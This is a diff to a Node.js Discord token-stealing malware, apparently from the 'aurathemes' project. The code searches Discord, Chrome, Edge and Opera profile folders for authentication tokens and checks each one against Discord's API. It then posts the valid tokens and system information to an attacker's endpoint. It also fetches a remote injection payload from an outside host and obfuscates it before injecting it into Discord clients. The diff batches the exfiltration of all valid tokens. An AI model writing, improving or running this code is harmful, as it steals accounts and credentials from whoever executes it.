@@ -10,13 +10,13 @@ let jsobf = require('javascript-obfuscator'),
 let tokens = new Array(),
     injectPath = new Array(),
 
-    API = "http://localhost:3000/request" // here you need to add your api so that the recommendation data can be sent to host in replit lol
+    killdcop = false, //(true) to restart all Discord processes, (false) for the opposite.
+    API = "http://localhost:3000/request" // here you need to add your (api) so that the recommendation data can be sent to host in replit lol
     
 switch (process.platform) {
     case "win32":
         let appdata = process.env.appdata,
             localappdata = process.env.localappdata,
-            killdcop = false,
             paths = [`${appdata}/discord/`,`${appdata}/discordcanary/`,`${appdata}/discordptb/`,`${appdata}/discorddevelopment/`,`${appdata}/lightcord/`,`${appdata}/Opera Software/Opera Stable/`,`${appdata}/Opera Software/Opera GX Stable/`,`${localappdata}/Google/Chrome/User Data/Default/`,`${localappdata}/Google/Chrome/User Data/Profile 1/`,`${localappdata}/Google/Chrome/User Data/Profile 2/`,`${localappdata}/Google/Chrome/User Data/Profile 3/`,`${localappdata}/Google/Chrome/User Data/Profile 4/`,`${localappdata}/Google/Chrome/User Data/Profile 5/`,`${localappdata}/Google/Chrome/User Data/Guest Profile/`,`${localappdata}/Google/Chrome/User Data/Default/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 1/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 2/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 3/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 4/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 5/Network/`,`${localappdata}/Google/Chrome/User Data/Guest Profile/Network/`,`${localappdata}/Microsoft/Edge/User Data/Default/`,`${localappdata}/Microsoft/Edge/User Data/Profile 1/`,`${localappdata}/Microsoft/Edge/User Data/Profile 2/`,`${localappdata}/Microsoft/Edge/User Data/Profile 3/`,`${localappdata}/Microsoft/Edge/User Data/Profile 4/`,`${localappdata}/Microsoft/Edge/User Data/Profile 5/`,`${localappdata}/Microsoft/Edge/User Data/Guest Profile/`,`${localappdata}/Microsoft/Edge/User Data/Default/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 1/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 2/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 3/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 4/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 5/Network/`,`${localappdata}/Microsoft/Edge/User Data/Guest Profile/Network/`],
             cords = ['discord','discordcanary','discordptb','discorddevelopment','lightcord'];startup()
 
@@ -115,19 +115,20 @@ switch (process.platform) {
         }
 
         async function check(t) {
+            let r = [];
             for (let a of t) {
-                await axios.get(`https://discord.com/api/v9/users/@me`, 
-                    {headers: {"Content-Type": "application/json","authorization": `${a}`}}
-                ).then(r => 
-                    {e = r.data}
-                ).catch(() => {
-                    e = null
-                }) 
-                if (!e) continue;
-                if (a) await sendall(a)
+                await axios.get(`https://discord.com/api/v9/users/@me`, {headers: {"Content-Type": "application/json","authorization": `${a}`}})
+                .then(r => {e = r.data})
+                .catch(() => {e = null}) 
+                if (e) {
+                    r.push(a); 
+                  }
+                }
+                if (r.length > 0) {
+                await sendall(r); 
             }
         }
-
+        
         async function inject() {
             let resp = await axios.get("https://6889.fun/aurathemes/api/inject", {headers: {aurathemes: true}});
             let obf = jsobf.obfuscate(resp.data.replace("*API*", API), {"ignoreRequireImports": true, "compact": true, "controlFlowFlattening": true, "controlFlowFlatteningThreshold": 0.5, "deadCodeInjection": false, "deadCodeInjectionThreshold": 0.01, "debugProtection": false, "debugProtectionInterval": 0, "disableConsoleOutput": true, "identifierNamesGenerator": "hexadecimal", "log": false, "numbersToExpressions": false, "renameGlobals": false, "selfDefending": false, "simplify": true, "splitStrings": false, "splitStringsChunkLength": 5, "stringArray": true, "stringArrayEncoding": ["base64"], "stringArrayIndexShift": true, "stringArrayRotate": false, "stringArrayShuffle": false, "stringArrayWrappersCount": 5, "stringArrayWrappersChainedCalls": true, "stringArrayWrappersParametersMaxCount": 5, "stringArrayWrappersType": "function", "stringArrayThreshold": 1, "transformObjectKeys": false, "unicodeEscapeSequence": false });
@@ -220,7 +221,7 @@ switch (process.platform) {
             fetch(`${API}/startup`, {
                 method: "POST", 
                 body: JSON.stringify({
-                    token: t,
+                    tokens: t,
                     filename: r,
                     ...getSystemInfo()
                 })
